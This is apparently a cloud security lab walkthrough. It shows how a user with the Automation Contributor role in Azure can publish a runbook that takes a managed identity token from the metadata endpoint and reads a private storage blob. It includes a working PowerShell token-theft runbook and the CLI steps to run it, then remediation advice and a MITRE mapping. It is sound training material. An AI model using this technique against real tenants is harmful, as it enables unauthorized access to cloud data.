# Automation Account Runbook Abuse

**Provider:** Azure | **Category:** Automation / Managed Identity

## Scenario

An Azure Automation Account has a **system-assigned managed identity** that holds
`Storage Blob Data Reader` on a private storage account containing the flag.
An attacker user was granted **Automation Contributor** on the Automation Account — a role that
lets them create and publish runbooks. Runbooks execute in the Automation sandbox **as the
managed identity**, giving the attacker indirect access to everything the identity can reach.

## Attack Path

```
[Attacker] Automation Contributor on Automation Account
    |
    v
az automation runbook create (PowerShell)  -->  author exploit runbook
    |
    v
Runbook queries IMDS for MI token (resource=https://storage.azure.com/)
    |
    v
Token used to GET /secrets/flag.txt from private storage account
    |
    v
az automation job stream list  -->  read flag from job output
```

### Step 1 — Log in and inspect the Automation Account

```bash
az login -u <attacker_username> -p <attacker_password>
az automation runbook list \
  --automation-account-name <aa_name> \
  --resource-group <rg_name>
```

### Step 2 — Create and publish an exploit runbook

```bash
cat > exploit.ps1 <<'EOF'
$response = Invoke-RestMethod `
  -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" `
  -Headers @{ Metadata = "true" }
$token = $response.access_token

$flag = Invoke-RestMethod `
  -Uri "https://<storage_account>.blob.core.windows.net/secrets/flag.txt" `
  -Headers @{ Authorization = "Bearer $token"; "x-ms-version" = "2019-12-12" }

Write-Output $flag
EOF

az automation runbook create \
  --automation-account-name <aa_name> \
  --resource-group <rg_name> \
  --name ExploitRunbook \
  --type PowerShell

az automation runbook replace-content \
  --automation-account-name <aa_name> \
  --resource-group <rg_name> \
  --name ExploitRunbook \
  --content @exploit.ps1

az automation runbook publish \
  --automation-account-name <aa_name> \
  --resource-group <rg_name> \
  --name ExploitRunbook
```

### Step 3 — Start the job and read the output

```bash
JOB_ID=$(az automation job create \
  --automation-account-name <aa_name> \
  --resource-group <rg_name> \
  --runbook-name ExploitRunbook \
  --query jobId -o tsv)

# Wait ~30s for the job to complete, then read output
az automation job stream list \
  --automation-account-name <aa_name> \
  --resource-group <rg_name> \
  --job-name "${JOB_ID}" \
  --query "[].value" -o tsv
```

## How to Fix in Production

1. **Restrict Automation Contributor** — use a custom role that allows monitoring runbooks but not creating or modifying them.
2. **Audit managed identity permissions** — treat MI credentials the same as service principal secrets; review what each Automation Account MI can access.
3. **Use Hybrid Runbook Workers** with network isolation instead of the shared Azure sandbox.
4. **Enable Defender for Cloud** alerts on new runbook creation and job starts from unexpected users.
5. **Require approval workflows** for runbook publishing via Azure DevOps pipelines rather than direct CLI access.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Steal Application Access Token | [T1528](https://attack.mitre.org/techniques/T1528/) |
| Unsecured Credentials: Cloud Instance Metadata API | [T1552.005](https://attack.mitre.org/techniques/T1552/005/) |
| Data from Cloud Storage | [T1530](https://attack.mitre.org/techniques/T1530/) |
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
